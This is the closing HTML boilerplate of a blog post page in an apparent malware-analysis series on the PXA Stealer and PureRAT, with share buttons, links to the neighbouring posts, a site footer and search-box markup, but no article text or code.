          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="mailto:?body=//localhost:1313/posts/python_malware_part2/&amp;subject=PXA%20Stealers%20Evolution%20to%20PureRAT:%20Part%202%20-%20In-Memory%20Python%20Loading%20%28Stages%203%20&amp;%204%29"
          title="Send via email"
          aria-label="Send via email">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span>
        </a>
      
    
  </section>


        

      </div>
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span class="flex flex-col">
          
            <a
              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/posts/python_malware_part1/">
              <span class="leading-6">
                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;PXA Stealers Evolution to PureRAT: Part 1 - Basics of Python Reversing & Static Analysis (Stage 1 & 2)
              </span>
            </a>
            
              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2025-08-29T00:00:00&#43;00:00">29 August 2025</time>
              </span>
            
          
        </span>
        <span class="flex flex-col items-end">
          
            <a
              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/posts/python_malware_part3/">
              <span class="leading-6">
                PXA Stealers Evolution to PureRAT: Part 3 - Weaponised Python Stage (Stage 5)&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
              </span>
            </a>
            
              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2025-08-31T00:00:00&#43;00:00">31 August 2025</time>
              </span>
            
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        


  






<div
  id="scroll-to-top"
  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
  <a
    href="#the-top"
    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
          
          
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
        <ul class="flex list-none flex-col sm:flex-row">
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/tags/"
                title="Tags">
                
                Tags
              </a>
            </li>
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/series/"
                title="Series">
                
                Series
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2026
          Darkrym
      </p>
    

    
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="//localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
